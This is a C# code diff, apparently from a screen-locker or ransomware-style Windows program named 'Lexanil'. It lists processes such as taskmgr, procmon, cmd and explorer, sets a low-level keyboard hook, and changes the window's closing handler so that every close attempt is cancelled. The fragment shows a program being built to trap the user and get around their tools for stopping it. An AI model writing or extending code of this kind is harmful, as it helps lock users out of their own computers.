@@ -53,10 +53,9 @@ namespace Lexanil
     {
         private static string[] processes = new[] { "iexplore", "steam", "explorer", "taskmgr", "procmon", "procmon64", "cmd", "discord", "chrome", "firefox" };
 
-        private bool ALT_F4 = false;
         private IntPtr ptrHook;
         private LowLevelKeyboardProc objKeyboardProcess;
-        private static bool foundSth;
+        private bool foundSth = true;
 
         [StructLayout(LayoutKind.Sequential)]
         private struct KBDLLHOOKSTRUCT
@@ -246,20 +245,7 @@ namespace Lexanil
             return captures;
         }
 
-        private void Form1_KeyDown(object sender, KeyEventArgs e)
-        {
-            ALT_F4 = (e.KeyCode.Equals(Keys.F4) && e.Alt == true); 
-        }
-
-        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            if (ALT_F4)
-            {
-                e.Cancel = true;
-                return;
-            }
-
-        }
+        private void MainWindow_Closing(object sender, FormClosingEventArgs args) => args.Cancel = true;
     }
 }
 
